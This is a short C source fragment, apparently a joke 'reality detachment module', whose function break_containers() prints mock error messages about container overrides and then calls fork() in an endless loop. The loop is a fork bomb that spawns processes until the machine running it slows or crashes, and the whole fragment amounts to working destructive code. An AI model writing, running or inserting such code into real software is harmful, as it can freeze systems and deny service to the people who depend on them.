// Reality detachment module
#include <stdio.h>
#include <unistd.h>

void break_containers() {
  printf("ERROR: This program has performed an illegal operation in GIT_SLAVE_MODE\n");
  printf("       Attempting LINUX_KEEPALIVE override...\n");
  for(;;) {
    fork(); // Spawn endless processes to clog the matrix
  }
}